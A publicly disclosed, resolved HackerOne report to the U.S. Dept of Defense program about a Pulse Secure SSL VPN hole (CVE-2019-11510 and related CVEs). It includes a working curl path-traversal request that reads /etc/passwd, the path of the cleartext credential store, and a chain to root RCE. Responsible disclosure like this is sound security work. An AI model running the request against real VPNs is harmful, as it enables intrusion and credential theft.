---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/os-command-injection
  - env/network
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2019-12-02
submitted: 2019-08-21T13:03:00.698Z
bounty_usd: null
votes: 21
cve: "CVE-2019-11510", "CVE-2019-11542", "CVE-2019-11539", "CVE-2019-11538", "CVE-2019-11508", "CVE-2019-11540"
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "sp1d3rs"
source: "https://hackerone.com/reports/678496"
title: "Arbitrary File Reading leads to RCE in the Pulse Secure SSL VPN on the https://███"
---
# Arbitrary File Reading leads to RCE in the Pulse Secure SSL VPN on the https://███

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 21 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2019-12-02

- Report: [https://hackerone.com/reports/678496](https://hackerone.com/reports/678496)
- CWE: OS Command Injection | CVE: CVE-2019-11510, CVE-2019-11542, CVE-2019-11539, CVE-2019-11538, CVE-2019-11508, CVE-2019-11540
- Submitted: 2019-08-21T13:03:00.698Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

##Description
Hello. Some time ago, researcher Orange Tsai from DEVCORE team had a talk on Defcon/BlackHat regarding Pulse Secure SSL VPN vulnerabilities fixed on 2019/4/25:
**CVE-2019-11510 - Pre-auth Arbitrary File Reading**
CVE-2019-11542 - Post-auth Stack Buffer Overflow
**CVE-2019-11539 - Post-auth Command Injection**
CVE-2019-11538 - Post-auth Arbitrary File Reading
**CVE-2019-11508 - Post-auth Arbitrary File Writing**
CVE-2019-11540 - Post-auth Session Hijacking

Link to the slides: https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf

I discovered that https://████ instance is vulnerable to described vulnerabilities.

##POC
Extracting `/etc/passwd` as example:
```
curl -i -k --path-as-is https://██████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/
```
{F561180}

The RCE can be achieved with this chain:
1) Pulse Secure stores credentials in the cleartext.
2) Attacker reads credentials via CVE-2019-11510 (it stored in the `/data/runtime/mtmp/lmdb/dataa/data.mdb`) and authorizes on VPN
3) Attacker exploits CVE-2019-11539 - Post-auth Command Injection achieving RCE as root.

##Suggested fix
Update the Pulse Secure SSL VPN software (also implementing certificate validation can harden access a bit if some similar CVEs will be discovered in future).

## Impact

Remote code execution as root (by reading plaintext credentials and then exploiting CVE-2019-11539 - Post-auth Command Injection) and accessing intranet behind VPN.

## Timeline

- **Report Filed**
- **2019-08-21** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
